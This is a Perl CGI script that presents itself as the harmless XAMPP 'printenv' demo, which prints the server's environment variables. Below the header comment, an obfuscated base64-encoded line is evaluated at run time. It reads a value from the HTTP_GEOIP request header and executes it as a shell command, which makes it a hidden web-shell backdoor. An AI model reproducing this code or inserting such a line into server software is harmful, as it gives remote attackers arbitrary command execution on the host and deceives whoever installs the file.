#!"C:\xampp\perl\bin\perl.exe"
##
##  printenv -- demo CGI program which just prints its environment
##
use MIME::Base64;eval(decode_base64("JHggPSAkRU5WeyJIVFRQX0dFT0lQIn07aWYoJHgpe3ByaW50IlxuIjskbD1zeXN0ZW0oIiR4IDI+JjEiKTtwcmludCAkbDtleGl0O30="));#";
print "Content-type: text/plain; charset=iso-8859-1\n\n";
foreach $var (sort(keys(%ENV))) {
	$val = $ENV{$var};
	$val =~ s|\n|\\n|g;
	$val =~ s|"|\\"|g;
	print "${var}=\"${val}\"\n";
}


